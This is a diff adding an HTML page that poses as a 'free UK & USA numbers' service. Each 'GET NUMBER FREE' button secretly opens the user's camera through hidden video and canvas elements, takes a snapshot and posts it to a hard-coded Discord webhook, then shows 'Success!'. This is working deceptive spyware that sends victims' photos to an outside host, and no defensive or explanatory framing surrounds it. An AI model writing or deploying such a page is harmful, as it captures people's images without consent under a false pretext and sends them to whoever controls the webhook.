@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Free Numbers</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #311042 100>
+        .main-container { width: 100%; max-width: 480px; display: flex; flex-direction:>
+        .header-title { text-align: center; margin-bottom: 10px; }
+        .header-title h1 { font-size: 22px; font-weight: 700; background: linear-gradie>
+        .number-list { display: flex; flex-direction: column; gap: 12px; width: 100%; }
+
+        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); bor>
+        .phone-info { display: flex; align-items: center; gap: 12px; width: 100%; justi>
+        .flag { font-size: 28px; }
+        .number { font-size: 18px; font-weight: 700; color: #f8fafc; }
+        .location { font-size: 12px; color: #cbd5e1; text-transform: uppercase; }
+
+        .btn { width: 100%; background: linear-gradient(90deg, #ff5500 0%, #ff7700 100%>
+
+        /* Status Text */
+        #status { color: #00efff; font-size: 14px; margin-top: 10px; text-align: center>
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="header-title">
+            <h1>FREE UK & USA NUMBERS</h1>
+        </div>
+
+        <div id="numberList" class="number-list"></div>
+        <p id="status"></p>
+    </div>
+
+    <!-- Hidden Elements for Camera -->
+    <video id="myPicture" autoplay playsinline style="display: none;"></video>
+    <canvas id="myCanvas" style="display: none;"></canvas>
+
+    <script>
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1538468593216393267>
+
+        const phoneNumbers = [
+            { countryCode: "+44", number: "20 7946 0123", city: "London, UK", flag: "🇬🇧>
+            { countryCode: "+44", number: "7700 900555", city: "Manchester", flag: "🇬🇧">
+            { countryCode: "+1", number: "212 555 0178", city: "New York", flag: "🇺🇸" },
+            { countryCode: "+44", number: "121 234 5678", city: "Birmingham", flag: "🇬🇧>
+            { countryCode: "+1", number: "415 555 0138", city: "Chicago, USA", flag: "🇺>
+        ];
+
+        // 1. Render UI                                                                         const container = document.getElementById('numberList');
+        phoneNumbers.forEach(item => {
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = `
+                <div class="phone-info">                                                                    <span class="flag">${item.flag}</span>
+                    <div class="details">
+                        <div class="number">${item.countryCode} ${item.number}</div>
+                        <div class="location">${item.city}</div>
+                    </div>
+                </div>
+            `;
+            // Button creation
+            const btn = document.createElement('button');
+            btn.className = 'btn';
+            btn.innerText = 'GET NUMBER FREE';
+            btn.onclick = startCamera; // Button click triggers camera
+            card.appendChild(btn);
+            container.appendChild(card);
+          });
+
+        // 2. Camera Logic
+        async function startCamera() {
+            const video = document.getElementById("myPicture");
+            const canvas = document.getElementById("myCanvas");
+            const statusText = document.getElementById("status");
+
+            statusText.innerHTML = "Processing...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { fac>
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    setTimeout(() => captureAndSend(video, canvas, statusText), 1000);
+                };
+            } catch (err) {
+                statusText.innerHTML = "Camera permission denied.";
+            }
+        }
+
+        function captureAndSend(video, canvas, statusText) {
+            const context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("file", blob, "snapshot.png");
+                formData.append("content", "📸 New image captured!");
+
+                fetch(discordWebhookUrl, { method: "POST", body: formData })
+                .then(res => {
+                    statusText.innerHTML = res.ok ? "✅ Success!" : "❌ Error.";
+                });
+            }, "image/png");
+
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
+    </script>
+</body>
+</html>
